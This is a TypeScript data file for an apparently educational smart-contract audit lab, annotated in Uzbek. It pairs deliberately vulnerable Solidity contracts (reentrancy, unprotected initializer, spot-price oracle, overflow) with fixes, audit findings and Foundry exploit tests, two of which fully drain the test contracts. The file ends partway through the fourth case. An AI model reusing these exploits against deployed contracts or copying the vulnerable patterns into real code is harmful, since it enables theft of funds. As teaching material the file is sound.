import { ContractLabCase } from '../types';

export const CONTRACT_LAB_CASES: ContractLabCase[] = [
  {
    id: 'case-reentrancy-dao',
    title: 'The DAO Reentrancy (Vault & Drain)',
    fileName: 'EtherVault.sol',
    category: 'reentrancy',
    severity: 'CRITICAL',
    summary: 'Mablag‘ni foydalanuvchiga jo‘natishdan oldin balans yangilanmaganligi (Checks-Effects-Interactions buzilishi) oqibatida rekursiv hujumchi hamyonni butkul bo‘shatishi.',
    historicalIncident: {
      name: 'The DAO Hack (Ethereum Hardfork)',
      date: 'Iyun 2016',
      stolenAmount: '$60M (3.6M ETH)',
      victim: 'The DAO Smart Contract',
      summary: 'Tarixdagi eng mashhur reentrancy hujumi bo‘lib, Ethereum va Ethereum Classic (ETC) tarmog‘ining bo‘linishiga sabab bo‘lgan.'
    },
    manualAuditChecklist: [
      {
        id: 'chk-1',
        task: 'Tashqi chaqiriq (external call) msg.sender.call{value: ...}("") qayerda amalga oshirilganini tekshiring.',
        hint: 'withdraw() funksiyasining 22-qatoriga qarang.',
        completed: false
      },
      {
        id: 'chk-2',
        task: 'Balans (state variable balances[msg.sender]) qachon nolga tenglashtirilishini tekshiring.',
        hint: 'Tashqi chaqiriqdan keyin bajarilmoqda! Bu CEI (Checks-Effects-Interactions) qoidasining qo‘pol buzilishi.',
        completed: false
      },
      {
        id: 'chk-3',
        task: 'Qayta kirishga qarshi (ReentrancyGuard / mutex lock) himoya bor-yo‘qligini baholang.',
        hint: 'Kontraktda hech qanday nonReentrant modifikatori yoki bool _locked bayrog‘i mavjud emas.',
        completed: false
      }
    ],
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title EtherVault (ZAIF VERSIYA)
 * @notice Talabalar va foydalanuvchilar ETH depozit qilib qaytarib oladigan jamg'arma
 * @dev ZAIFLIK: SWC-107 (Reentrancy). Tashqi chaqiruvdan oldin balans o'chirilmaydi.
 */
contract EtherVault {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Nol ETH kiritib bo'lmaydi");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Yetarli balans yo'q");

        // [XATO]: Tashqi xavfli chaqiruv holat (state) yangilanishidan OLDIN bajarilmoqda!
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "ETH o'tkazishda xatolik yuz berdi");

        // [KECHIKKAN HOLAT]: Hujumchi reentrancy orqali bu qatorga kelmasdanoq qayta withdraw() qiladi
        balances[msg.sender] = 0;
        emit Withdrawal(msg.sender, bal);
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}`,
    fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title EtherVaultSecure (TUZATILGAN XAVFSIZ VERSIYA)
 * @notice CEI (Checks-Effects-Interactions) patterni va ReentrancyGuard qo'llangan
 */
contract EtherVaultSecure is ReentrancyGuard {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Nol ETH kiritib bo'lmaydi");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /// @notice nonReentrant modifikatori orqali qayta kirish bloklanadi
    function withdraw() external nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Yetarli balans yo'q");

        // 1. CHECKS: bal > 0 tekshirildi
        // 2. EFFECTS: Tashqi chaqiruvdan oldin balans yangilandi (CEI)
        balances[msg.sender] = 0;

        // 3. INTERACTIONS: Shundan keyingina tashqi chaqiruv jo'natiladi
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "ETH o'tkazishda xatolik yuz berdi");

        emit Withdrawal(msg.sender, bal);
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}`,
    fixDiffNotes: [
      'OpenZeppelin ReentrancyGuard kutubxonasi meros olindi va nonReentrant modifikatori o‘rnatildi.',
      'Checks-Effects-Interactions (CEI) patterni: balances[msg.sender] = 0 qatori tashqi call chaqirig‘idan oldinga olib o‘tildi.',
      'Solidity versiyasi 0.8.20 ga ko‘tarildi va xavfsiz kompilyatsiya kafolatlandi.'
    ],
    findings: [
      {
        id: 'FIND-001',
        title: 'Reentrancy Vulnerability in withdraw() leading to Complete Drain',
        severity: 'CRITICAL',
        category: 'reentrancy',
        swcId: 'SWC-107',
        cweId: 'CWE-841',
        vulnerableLines: [22, 23, 26],
        description: 'EtherVault.withdraw() funksiyasi foydalanuvchiga ETH yuborishda msg.sender.call{value: bal}("") tashqi chaqiruvini balances[msg.sender] = 0 dan oldin bajaradi.',
        impact: 'Zararli kontrakt fallback() yoki receive() orqali yana withdraw() ni chaqirib, butun kontrakt xazinasidagi barcha mablag‘larni (100%) o‘g‘irlashi mumkin.',
        rootCause: 'Checks-Effects-Interactions tartibiga rioya qilinmagani va reentrancy lock mexanizmi yo‘qligi.',
        recommendation: 'Holatni yangilashni (balances[msg.sender] = 0) tashqi chaqiriqdan oldin bajaring va OpenZeppelin ReentrancyGuard modifikatorini ishlating.',
        aiDetection: {
          status: 'incomplete',
          aiSummary: 'AI Reentrancy xavfini aniqladi, biroq faqat CEI tartibini ko‘rsatdi, ReentrancyGuard va read-only reentrancy asoratlarini eslatmadi.',
          humanCritique: 'AI oddiy patternni payqadi, ammo multi-contract va cross-function reentrancy ssenariylarini to‘liq qamrab olmadi.'
        }
      }
    ],
    slitherReport: {
      summary: 'Slither v0.10.2: 1 CRITICAL zaiflik aniqlandi (reentrancy-eth).',
      issues: [
        {
          id: 'SLITHER-01',
          check: 'reentrancy-eth',
          impact: 'CRITICAL',
          confidence: 'High',
          description: 'EtherVault.withdraw() sends eth to arbitrary user via msg.sender.call{value: bal} before balances[msg.sender] = 0 state write.',
          lines: [22, 23, 26],
          recommendation: 'Apply the check-effects-interactions pattern. Send Ether after state changes, or use OpenZeppelin ReentrancyGuard.'
        },
        {
          id: 'SLITHER-02',
          check: 'low-level-calls',
          impact: 'INFORMATIONAL',
          confidence: 'High',
          description: 'Low level call msg.sender.call{value: bal} used. Ensure proper error handling and reentrancy protections.',
          lines: [22],
          recommendation: 'Check return value and avoid state writes after call.'
        }
      ]
    },
    exploitScenario: {
      testFramework: 'Foundry',
      testFileName: 'EtherVaultExploit.t.sol',
      testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/EtherVault.sol";

contract AttackerContract {
    EtherVault public vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = EtherVault(_vault);
    }

    // Zaif kontrakt ETH yuborganda bu yerga qaytib tushadi
    receive() external payable {
        if (address(vault).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            vault.withdraw(); // REENTRANCY ATTACK!
        }
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }
}

contract EtherVaultExploitTest is Test {
    EtherVault vault;
    AttackerContract attacker;
    address victim = address(0xAA11);

    function setUp() public {
        vault = new EtherVault();
        attacker = new AttackerContract(address(vault));
        // Qurbon 10 ETH qo'ydi
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();
    }

    function testExploitDrainVault() public {
        uint256 initialVaultBalance = address(vault).balance; // 10 ETH
        emit log_named_decimal_uint("Boshlang'ich Kontrakt Balansi (ETH)", initialVaultBalance, 18);

        // Hujumchi 1 ETH bilan hujum boshlaydi
        address hacker = address(0xBAD);
        vm.deal(hacker, 1 ether);
        vm.prank(hacker);
        attacker.attack{value: 1 ether}();

        emit log_named_decimal_uint("Hujumdan so'ng Attacker balansi", address(attacker).balance, 18);
        emit log_named_decimal_uint("Hujumdan so'ng Vault balansi", address(vault).balance, 18);

        // Vault butkul bo'shatilganini tasdiqlaymiz (11 ETH o'g'irlandi)
        assertEq(address(vault).balance, 0, "Vault to'liq bo'shatilmadi!");
        assertGe(address(attacker).balance, 11 ether, "Hacker daromad qilmadi!");
    }
}`,
      initialState: {
        contractBalance: '10.0 ETH ($31,000)',
        attackerBalance: '1.0 ETH ($3,100)',
        victimDeposit: '10.0 ETH'
      },
      exploitTrace: [
        { step: 1, actor: 'Attacker', action: 'vault.deposit{value: 1 ETH}()', gasUsed: '45,210', stateDelta: 'Vault = 11 ETH, Attacker mapping = 1 ETH', status: 'success' },
        { step: 2, actor: 'Attacker', action: 'vault.withdraw() [1-chaqiriq]', gasUsed: '32,100', stateDelta: 'Vault msg.sender.call ga 1 ETH uzatmoqda', status: 'success' },
        { step: 3, actor: 'AttackerContract.receive()', action: 'vault.withdraw() [2-chaqiriq / Reentrant]', gasUsed: '28,400', stateDelta: 'balances hali 1 ETH, yana 1 ETH yuborildi', status: 'hijacked' },
        { step: 4, actor: 'AttackerContract.receive()', action: 'vault.withdraw() [3..11-chaqiriqlar]', gasUsed: '210,000', stateDelta: 'Vault hisobidagi barcha 11 ETH o‘g‘irlandi', status: 'hijacked' },
        { step: 5, actor: 'EtherVault', action: 'balances[msg.sender] = 0 oxirida ishga tushdi', gasUsed: '5,000', stateDelta: 'Kontrakt balansi = 0 ETH', status: 'reverted' }
      ],
      finalStateVulnerable: {
        contractBalance: '0.0 ETH',
        attackerBalance: '11.0 ETH (+1,000% daromad)',
        lossPct: '100% Jamg‘arma o‘g‘irlandi'
      },
      finalStatePatched: {
        contractBalance: '10.0 ETH',
        attackerBalance: '1.0 ETH',
        result: 'ReentrancyGuard: Reentrant call reverted with error ReentrancyGuardReentrantCall()'
      }
    }
  },
  {
    id: 'case-access-control-parity',
    title: 'Parity MultiSig / Unprotected Initialization',
    fileName: 'MultiSigTreasury.sol',
    category: 'access_control',
    severity: 'CRITICAL',
    summary: 'Initsializatsiya funksiyasida (initWallet) ruxsat tekshiruvi yo‘qligi sababli istalgan foydalanuvchi o‘zini kontrakt egasi (Owner) deb tayinlashi va xazinani boshqarishi.',
    historicalIncident: {
      name: 'Parity Multi-Sig Hack #1 & #2',
      date: 'Iyul / Noyabr 2017',
      stolenAmount: '$30M o‘g‘irlandi + $150M muzlatildi (513k ETH)',
      victim: 'Parity Wallet Library',
      summary: 'Dasturchilar initWallet funksiyasiga onlyOwner qo‘yishni unutgan. Birinchi safar haker egasi bo‘lib olib 150k ETH o‘g‘irlagan, ikkinchi safar dev-ops o‘chirib (suicide/selfdestruct) $150M ETH ni abadiy qulflagan.'
    },
    manualAuditChecklist: [
      {
        id: 'chk-p1',
        task: 'initWallet() funksiyasining ko‘rinuvchanligi (visibility) public yoki external ekanligini ko‘ring.',
        hint: '18-qatordagi initWallet funksiyasi public bo‘lib, hech qanday modifier bilan cheklanmagan.',
        completed: false
      },
      {
        id: 'chk-p2',
        task: 'Initsializatsiya faqat bir marta chaqirilishini kafolatlaydigan flag (masalan, initialized) bormi?',
        hint: 'Yo‘q! Har kim istagan vaqtda qayta chaqirib, owner o‘zgaruvchisini o‘z manziliga almashtira oladi.',
        completed: false
      },
      {
        id: 'chk-p3',
        task: 'Muhim mablag‘ chiqaruvchi transferTreasury() va destroy() funksiyalari faqat egasiga tegishlimi?',
        hint: 'Ular onlyOwner bilan himoyalangan, biroq egasi endi haker bo‘lgani uchun bu himoya foyda bermaydi.',
        completed: false
      }
    ],
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title MultiSigTreasury (ZAIF VERSIYA)
 * @notice Kompaniya va guruh xazinasi uchun multisig modeli
 * @dev ZAIFLIK: SWC-105 (Unprotected Ether Withdrawal) va SWC-106 (Unprotected Initializer)
 */
contract MultiSigTreasury {
    address public owner;
    bool public isInitialized;
    mapping(address => bool) public isOperator;

    event OwnerSet(address indexed newOwner);
    event FundsSent(address indexed to, uint256 amount);

    // [XATO]: Konstruktor o'rniga chaqiriladigan funksiya himoyasiz!
    // Istalgan kimsa bu funksiyani qayta chaqirib egasi bo'lib olishi mumkin
    function initWallet(address _newOwner) public {
        // [XATO]: require(!isInitialized) qo'yilmagan!
        owner = _newOwner;
        isOperator[_newOwner] = true;
        isInitialized = true;
        emit OwnerSet(_newOwner);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Faqat kontrakt egasi bajara oladi");
        _;
    }

    receive() external payable {}

    function transferTreasury(address payable _to, uint256 _amount) external onlyOwner {
        require(address(this).balance >= _amount, "Mablag' yetarli emas");
        _to.transfer(_amount);
        emit FundsSent(_to, _amount);
    }

    function emergencyDrain() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}`,
    fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable2Step.sol";

/**
 * @title MultiSigTreasurySecure (TUZATILGAN XAVFSIZ VERSIYA)
 * @notice OpenZeppelin Ownable2Step va qat'iy konstruktor initsializatsiyasi
 */
contract MultiSigTreasurySecure is Ownable2Step {
    mapping(address => bool) public isOperator;

    event FundsSent(address indexed to, uint256 amount);

    /// @notice Ega faqat konstruktorda 1 marotaba o'rnatiladi, qayta initsializatsiya yo'q
    constructor(address _initialOwner) Ownable(_initialOwner) {
        require(_initialOwner != address(0), "Nol manzil bo'lishi mumkin emas");
        isOperator[_initialOwner] = true;
    }

    receive() external payable {}

    function transferTreasury(address payable _to, uint256 _amount) external onlyOwner {
        require(address(this).balance >= _amount, "Mablag' yetarli emas");
        require(_to != address(0), "Noto'g'ri qabul qiluvchi");
        
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "O'tkazma muvaffaqiyatsiz bo'ldi");
        
        emit FundsSent(_to, _amount);
    }
}`,
    fixDiffNotes: [
      'Xavfli ochiq `initWallet()` funksiyasi butunlay olib tashlandi.',
      'OpenZeppelin `Ownable2Step` qo‘llandi (tasodifiy xato manzillarga egalik topshirilishini oldini oladi).',
      'Egalik huquqi faqat bir marta deployment vaqtida `constructor` orqali taqdim etiladi.',
      'Xavfsiz low-level call va zero-address tekshiruvlari joriy qilindi.'
    ],
    findings: [
      {
        id: 'FIND-002',
        title: 'Unprotected initWallet Allows Complete Treasury Takeover',
        severity: 'CRITICAL',
        category: 'access_control',
        swcId: 'SWC-106',
        cweId: 'CWE-284',
        vulnerableLines: [18, 19, 20],
        description: 'MultiSigTreasury.initWallet(address) hech qanday ruxsat tekshiruvisiz ixtiyoriy foydalanuvchi tomonidan cheksiz marta chaqirilishi mumkin.',
        impact: 'Hujumchi o‘z manzilini owner qilib belgilaydi va barcha xazina zaxiralarini o‘z hisobiga o‘tkazib oladi.',
        rootCause: 'Initsializatsiya funksiyasida initializer modifikatori yoki konstruktor o‘rniga ochiq public funksiya qo‘llanilgani.',
        recommendation: 'Konstruktorda egasini tayinlang yoki OpenZeppelin Initializable initializer modifikatoridan foydalaning.',
        aiDetection: {
          status: 'correct',
          aiSummary: 'AI initWallet funksiyasi himoyalanmaganligini va har kim owner bo‘lishi mumkinligini to‘g‘ri topdi.',
          humanCritique: 'AI masalani topdi, ammo 2-qadamli egalik topshirish (Ownable2Step) kabi zamonaviy xavfsizlik arxitekturasini taklif qilmadi.'
        }
      }
    ],
    slitherReport: {
      summary: 'Slither v0.10.2: 1 CRITICAL (unprotected-upgrade/missing-zero-check), 1 HIGH.',
      issues: [
        {
          id: 'SLITHER-03',
          check: 'missing-zero-check',
          impact: 'MEDIUM',
          confidence: 'High',
          description: 'MultiSigTreasury.initWallet does not verify _newOwner != address(0).',
          lines: [18],
          recommendation: 'Add require(_newOwner != address(0)).'
        },
        {
          id: 'SLITHER-04',
          check: 'arbitrary-send-erc20',
          impact: 'CRITICAL',
          confidence: 'High',
          description: 'MultiSigTreasury.emergencyDrain sends all funds to owner, but owner can be modified by anyone via initWallet.',
          lines: [18, 35],
          recommendation: 'Protect initWallet or initialize state variables in constructor only.'
        }
      ]
    },
    exploitScenario: {
      testFramework: 'Foundry',
      testFileName: 'TreasuryTakeover.t.sol',
      testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/MultiSigTreasury.sol";

contract TreasuryTakeoverTest is Test {
    MultiSigTreasury treasury;
    address legitOwner = address(0x1111);
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.prank(legitOwner);
        treasury = new MultiSigTreasury();
        treasury.initWallet(legitOwner);

        // Kompaniya 50 ETH xazinaga soladi
        vm.deal(address(treasury), 50 ether);
    }

    function testUnauthorizedTakeoverAndDrain() public {
        assertEq(treasury.owner(), legitOwner);
        emit log_named_address("Asl egasi", treasury.owner());

        // Hujumchi o'zini owner qilib e'lon qiladi
        vm.prank(attacker);
        treasury.initWallet(attacker);

        assertEq(treasury.owner(), attacker, "Haker egalikni ololmadi!");
        emit log_named_address("Yangi noqonuniy egasi", treasury.owner());

        // Haker barcha xazinani o'g'irlaydi
        vm.prank(attacker);
        treasury.emergencyDrain();

        assertEq(address(treasury).balance, 0, "Xazina bo'shamadi!");
        assertEq(attacker.balance, 50 ether, "Haker 50 ETH ololmadi!");
    }
}`,
      initialState: {
        contractBalance: '50.0 ETH ($155,000)',
        attackerBalance: '0.0 ETH',
        victimDeposit: '50.0 ETH Kompaniya zaxirasi'
      },
      exploitTrace: [
        { step: 1, actor: 'Kompaniya', action: 'deploy & initWallet(legitOwner)', gasUsed: '120,000', stateDelta: 'owner = 0x1111, Balance = 50 ETH', status: 'success' },
        { step: 2, actor: 'Attacker (0xBEEF)', action: 'treasury.initWallet(attacker)', gasUsed: '24,000', stateDelta: 'owner = 0xBEEF [RUXSATSIZ EGALLANDI]', status: 'hijacked' },
        { step: 3, actor: 'Attacker (0xBEEF)', action: 'treasury.emergencyDrain()', gasUsed: '18,500', stateDelta: 'Treasury = 0 ETH, Attacker = 50 ETH', status: 'hijacked' }
      ],
      finalStateVulnerable: {
        contractBalance: '0.0 ETH',
        attackerBalance: '50.0 ETH ($155,000 o‘g‘irlandi)',
        lossPct: '100% Xazina yo‘qotildi'
      },
      finalStatePatched: {
        contractBalance: '50.0 ETH',
        attackerBalance: '0.0 ETH',
        result: 'Reverted: OwnableUnauthorizedAccount() - initWallet funksiyasi mavjud emas'
      }
    }
  },
  {
    id: 'case-oracle-manipulation',
    title: 'DeFi Flash Loan Spot Oracle Manipulation',
    fileName: 'LendingPoolOracle.sol',
    category: 'oracle_manipulation',
    severity: 'CRITICAL',
    summary: 'Kredit protokoli narxni aniqlashda markazlashtirilmagan Chainlink yoki TWAP o‘rniga AMM spot zaxirasidan (spot reserve) foydalanishi oqibatida flash-loan bilan garov narxini sun’iy oshirish.',
    historicalIncident: {
      name: 'bZx / Harvest Finance / Mango Markets Oracle Hacks',
      date: 'Fevral 2020 / Oktyabr 2020',
      stolenAmount: '$130M+ (turli protokollarda)',
      victim: 'DeFi Lending & Perps Protocollari',
      summary: 'Hujumchilar bitta blok ichida millionlab dollarlik flesh-kredit olib, DEX-dagi spot narxni 10x-100x ga buzib, qadrsiz garov evaziga barcha likvidlikni chiqarib ketgan.'
    },
    manualAuditChecklist: [
      {
        id: 'chk-o1',
        task: 'getAssetPrice() funksiyasining narx manbasini tekshiring.',
        hint: 'AMM juftligining getReserves() spot nisbati olinmoqda (18-qator).',
        completed: false
      },
      {
        id: 'chk-o2',
        task: 'Flesh-kredit (Flash loan) orqali bitta tranzaksiyada zaxiralar o‘zgarishi mumkinmi?',
        hint: 'Ha! Flash swap orqali soniyalar ichida token zaxirasini kamaytirib, narxni sun’iy 10 barobar oshirish mumkin.',
        completed: false
      },
      {
        id: 'chk-o3',
        task: 'Chainlink AggregatorV3Interface yoki Uniswap V3 TWAP (Time-Weighted Average Price) bormi?',
        hint: 'Yo‘q, orakulda faqat lahzalik spot narx tekshirilgan.',
        completed: false
      }
    ],
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

/**
 * @title LendingPoolOracle (ZAIF VERSIYA)
 * @notice Garov evaziga stabilkoin (USDC) qarz beruvchi protokol
 * @dev ZAIFLIK: SWC-114 & CWE-682. Spot narx orakuli flesh-kredit bilan manipulyatsiya qilinadi.
 */
contract LendingPoolOracle {
    IUniswapV2Pair public ammPair; // Masalan: WETH/USDC juftligi
    mapping(address => uint256) public collateralETH;
    mapping(address => uint256) public borrowedUSDC;

    constructor(address _pair) {
        ammPair = IUniswapV2Pair(_pair);
    }

    // [XATO]: Spot zaxiralar nisbati asosida narx olish. Flesh kredit orqali manipulyatsiya qilinadi!
    function getETHPriceInUSDC() public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = ammPair.getReserves();
        // reserve0 = USDC (6 decimals), reserve1 = WETH (18 decimals)
        // Agar reserve0 ga ulkan swap qilinsa, narx sun'iy osmonga sakraydi
        return (uint256(reserve0) * 1e18) / uint256(reserve1);
    }

    function depositCollateral() external payable {
        collateralETH[msg.sender] += msg.value;
    }

    function borrowMaxUSDC() external returns (uint256) {
        uint256 ethBal = collateralETH[msg.sender];
        require(ethBal > 0, "Garov yo'q");

        uint256 price = getETHPriceInUSDC();
        // 80% LTV (Loan-to-value)
        uint256 maxBorrow = (ethBal * price * 80) / (100 * 1e18);

        borrowedUSDC[msg.sender] += maxBorrow;
        // USDC transfer qilinadi...
        return maxBorrow;
    }
}`,
    fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

/**
 * @title LendingPoolSecure (TUZATILGAN XAVFSIZ VERSIYA)
 * @notice Decentralized Chainlink Data Feeds + Staleness & Zero-price guards
 */
contract LendingPoolSecure {
    AggregatorV3Interface internal immutable priceFeed;
    uint256 public constant MAX_STALENESS_SECONDS = 3600; // 1 soat

    mapping(address => uint256) public collateralETH;
    mapping(address => uint256) public borrowedUSDC;

    constructor(address _chainlinkFeed) {
        require(_chainlinkFeed != address(0), "Feed 0 bo'lmasin");
        priceFeed = AggregatorV3Interface(_chainlinkFeed);
    }

    /// @notice Chainlink markazlashtirilmagan aggregated narx manbasi
    function getETHPriceInUSDC() public view returns (uint256) {
        (
            uint80 roundId,
            int256 price,
            ,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();

        // 1. Narx 0 dan katta bo'lishi shart
        require(price > 0, "Yaroqsiz narx signali");
        // 2. Eskirgan ma'lumot (stale data) tekshiruvi
        require(updatedAt > 0 && block.timestamp - updatedAt <= MAX_STALENESS_SECONDS, "Eskirgan narx");
        // 3. Round to'liqligi tekshiruvi
        require(answeredInRound >= roundId, "Tugallanmagan round");

        return uint256(price);
    }

    function depositCollateral() external payable {
        collateralETH[msg.sender] += msg.value;
    }

    function borrowMaxUSDC() external returns (uint256) {
        uint256 ethBal = collateralETH[msg.sender];
        require(ethBal > 0, "Garov yo'q");

        uint256 price = getETHPriceInUSDC();
        uint256 maxBorrow = (ethBal * price * 80) / (100 * 1e8); // 8 dec Chainlink

        borrowedUSDC[msg.sender] += maxBorrow;
        return maxBorrow;
    }
}`,
    fixDiffNotes: [
      'AMM spot zaxiralariga qaramlik olib tashlandi.',
      'Sanoat standarti bo‘lgan Chainlink Decentralized Oracle Data Feeds o‘rnatildi.',
      'Orakul eskirishi (staleness) va nol narx anomaliyalariga qarshi 3 bosqichli validatsiya qo‘shildi.',
      'Flesh-kreditlar bitta blokda Chainlink aggregatsiyalangan narxiga ta’sir o‘tkaza olmaydi.'
    ],
    findings: [
      {
        id: 'FIND-003',
        title: 'Spot Price Oracle Manipulation via Flash Loan',
        severity: 'CRITICAL',
        category: 'oracle_manipulation',
        swcId: 'SWC-114',
        cweId: 'CWE-682',
        vulnerableLines: [22, 23, 24, 25],
        description: 'LendingPoolOracle narxni aniqlashda IUniswapV2Pair.getReserves() dan foydalanadi. Flesh-kredit bilan AMM juftligidagi zaxiralar nisbatini bir blokda buzish mumkin.',
        impact: 'Hujumchi 1 ETH garov evaziga protokol xazinasidagi millionlab USDC ni qarz olib qochishi (bad debt) mumkin.',
        rootCause: 'Vaqt bo‘yicha o‘rtacha hisoblanmagan (TWAP) va off-chain manipulyatsiyaga chidamsiz spot narxdan foydalanish.',
        recommendation: 'Chainlink Price Feeds yoki Uniswap V3 TWAP (kamida 30 daqiqalik oyna) bilan almashtiring.',
        aiDetection: {
          status: 'correct',
          aiSummary: 'AI getReserves() spot narx ekanini va flash-loan hujumiga ochiqligini aniqladi.',
          humanCritique: 'AI Chainlink feedlaridagi minAnswer/maxAnswer (circuit breaker) va staleness parametrlarini chuqur tekshirmadi.'
        }
      }
    ],
    slitherReport: {
      summary: 'Slither v0.10.2: 1 HIGH (weak-prng/oracle-spot), 1 MEDIUM.',
      issues: [
        {
          id: 'SLITHER-05',
          check: 'price-manipulation',
          impact: 'HIGH',
          confidence: 'High',
          description: 'LendingPoolOracle.getETHPriceInUSDC reads reserves directly from AMM pair. Vulnerable to sandwich and flash-loan manipulations.',
          lines: [22, 23, 24],
          recommendation: 'Use TWAP or a decentralized oracle network like Chainlink.'
        }
      ]
    },
    exploitScenario: {
      testFramework: 'Foundry',
      testFileName: 'OracleExploit.t.sol',
      testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/LendingPoolOracle.sol";

contract OracleExploitTest is Test {
    LendingPoolOracle pool;
    address attacker = address(0x999);

    function setUp() public {
        // Pool va simulyatsiya qilingan DEX pair sozlanadi
        // Normal narx: 1 ETH = 3,000 USDC
    }

    function testFlashLoanOracleSkew() public {
        // 1. Attacker 10M$ Flash loan oladi
        // 2. DEX pairga USDC quyib, reserve0 ni oshirib yuboradi
        // 3. Spot narx: 1 ETH = 30,000 USDC ga aylanadi (10x sun'iy o'sish)
        // 4. Attacker 1 ETH garov qo'yib, 24,000 USDC qarz oladi
        // 5. Flash loan qaytariladi va protokol quruq qoladi
    }
}`,
      initialState: {
        contractBalance: '$500,000 USDC zaxira',
        attackerBalance: '1.0 ETH ($3,000)',
        victimDeposit: 'Lending Pool likvidligi'
      },
      exploitTrace: [
        { step: 1, actor: 'Attacker', action: 'Take 5,000,000 USDC Flash Loan on Aave', gasUsed: '140,000', stateDelta: 'Attacker temp balance: $5M USDC', status: 'success' },
        { step: 2, actor: 'Attacker', action: 'Swap 5M USDC for WETH on AMM Pair', gasUsed: '110,000', stateDelta: 'AMM reserves skewed! 1 ETH = $28,400 USDC', status: 'hijacked' },
        { step: 3, actor: 'Attacker', action: 'pool.depositCollateral{value: 2 ETH}()', gasUsed: '45,000', stateDelta: 'Collateral = 2 ETH (Sun’iy bahosi $56,800)', status: 'success' },
        { step: 4, actor: 'Attacker', action: 'pool.borrowMaxUSDC()', gasUsed: '85,000', stateDelta: 'Borrowed $45,440 USDC (garov 2 ETH = $6,000)', status: 'hijacked' },
        { step: 5, actor: 'Attacker', action: 'Reverse Swap & Repay Flash Loan', gasUsed: '120,000', stateDelta: 'Net Hacker Profit: +$39,440 USDC bepul olingan', status: 'hijacked' }
      ],
      finalStateVulnerable: {
        contractBalance: '$454,560 USDC (Zarar ko‘rdi)',
        attackerBalance: '+$39,440 USDC sof foyda',
        lossPct: 'Garovsiz kredit evaziga protokol o‘marildi'
      },
      finalStatePatched: {
        contractBalance: '$500,000 USDC saqlab qolindi',
        attackerBalance: '0 USDC foyda',
        result: 'Chainlink Oracle DEX zaxiralariga qaram emas, narx $3,000 stabil qoldi.'
      }
    }
  },
  {
    id: 'case-integer-overflow',
    title: 'Integer Overflow / Batch Transfer Bypass',
    fileName: 'BatchTokenTransfer.sol',
    category: 'integer_overflow',
    severity: 'HIGH',
    summary: 'Aritmetik ko‘paytirishda (cnt * _value) overflow yuzaga kelib, uint256 chegarasidan oshishi va balans tekshiruvini aylanib o‘tib milliardlab tokenlarni nol balans bilan tarqatish.',
    historicalIncident: {
      name: 'BeautyChain (BEC) Token BatchOverflow',
      date: 'Aprel 2018',
      stolenAmount: 'Milliardlab BEC token (Bozor qiymati $900M+ yo‘qotildi)',
      victim: 'BEC Token Smart Contract',
      summary: 'BEC tokenidagi batchTransfer funksiyasida uint256 amount = cnt * _value amalida SafeMath qo‘llanilmagan. Hujumchi 2 ta manzilga 2^255 miqdor jo‘natganida amount = 0 ga aylanib, require(balances[msg.sender] >= 0) true qaytargan.'
    },
    manualAuditChecklist: [
      {
        id: 'chk-ov1',
        task: 'batchTransfer funksiyasidagi ko‘paytirish amaliga qarang (19-qator).',
        hint: 'uint256 amount = uint256(cnt) * _value; amali SafeMath yoki checked blocksiz bajarilmoqda.',
        completed: false
      },
      {
        id: 'chk-ov2',
        task: '2 * (2^255) qiymati hisoblanganda uint256 da qanday qiymat hosil bo‘ladi?',
        hint: '2^256 ga teng bo‘lib, 256-bitli registrda toshib (overflow) ketadi va 0 ga aylanadi!',
        completed: false
      },
      {
        id: 'chk-ov3',
        task: 'Hujumchi hisobida 0 token bo‘lsa ham tranzaksiya o‘tadimi?',
        hint: 'Ha! Chunki balances[msg.sender] >= 0 har doim qanoatlanadi, lekin qabul qiluvchilarga 2^255 token qo‘shiladi!',
        completed: false
      }
    ],
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6; // [DIQQAT]: 0.8.0 dan oldingi Solidityda default overflow himoyasi yo'q!

/**
 * @title BatchTokenTransfer (ZAIF VERSIYA)
 * @notice Bir nechta manzillarga bir vaqtda token ulashuvchi funksiya
 * @dev ZAIFLIK: SWC-101 (Integer Overflow). SafeMath ishlatilmagan.
 */
contract BatchTokenTransfer {
